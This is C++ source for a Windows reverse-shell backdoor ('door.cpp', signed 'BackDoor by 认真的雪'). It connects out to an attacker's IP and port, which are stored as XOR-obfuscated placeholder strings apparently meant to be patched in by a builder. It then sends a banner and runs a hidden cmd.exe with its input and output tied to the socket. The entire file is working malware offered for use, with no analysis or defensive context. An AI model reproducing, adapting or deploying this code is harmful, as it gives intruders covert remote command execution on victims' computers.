// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

int cmdshell(SOCKET s)
{   	
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
    CloseHandle(ProcessInformation.hProcess);	
	return 0;
}

int main(int argc, char* argv[])
{
		char wMessage[512] = "\r\n========================  BackDoor by 认真的雪  ========================\r\n"; 
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(s == INVALID_SOCKET)
	{
		printf(" socket error \n");
		return 0;
	}
	char Port[256]="AAAAAAAAAAAAAAAAAA";
	char Ip[256]="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
	//得到IP字符串长度
	int len=strlen(Ip);
	//进行抑或解密
	for(int i=0;i<len;i++)
	{
		Ip[i]=Ip[i]^97;
	}
	sockaddr_in sin; 
	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(Port));
	//使用解密后的数据
	sin.sin_addr.S_un.S_addr = inet_addr(Ip);
	if(connect(s, (sockaddr*)&sin, sizeof(sin)) == -1)
	{
		printf(" connect error \n");
		return 0;
	}
	if (send(s,wMessage,strlen(wMessage),0)==SOCKET_ERROR)
	{
        printf("Send message error \n");
        return 0;
	}

	cmdshell(s);
	return 0;
	
}
